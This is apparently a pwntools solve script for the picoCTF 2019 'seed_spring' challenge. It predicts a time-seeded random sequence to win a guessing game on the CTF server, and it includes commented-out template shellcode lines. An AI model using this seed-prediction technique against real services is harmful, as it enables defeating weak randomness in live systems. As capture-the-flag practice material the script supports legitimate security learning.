#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --port 47241
from pwn import *
import time

# Set up pwntools for the correct architecture
context.update(arch='i386')
context.log_level = 'DEBUG'
exe = './seed_spring'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 47241)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *srand
break *main
break *main+383
break *main+446
break *main+477
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


start_time = time.time() - 5

while True:
    io = start()
    rand = process(['./rand',str(start_time)])
    answers = rand.recvall().split()
    print(start_time)
    print(answers)

    for answer in answers:
        io.sendlineafter('Guess the height: ', str(int(answer) & 0xf))
        #io.sendline(str(int(answer) & 0xf))
        response = io.recv()
        #print(response)
        if b"WRONG!" in response:
            print("Wrong start time, adjusting")
            start_time += 1
            break
        if b"LEVEL" in response:
            io.interactive()

    if b"Congratulation!" in response:
        print(io.recvall())
        sys.exit()




# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

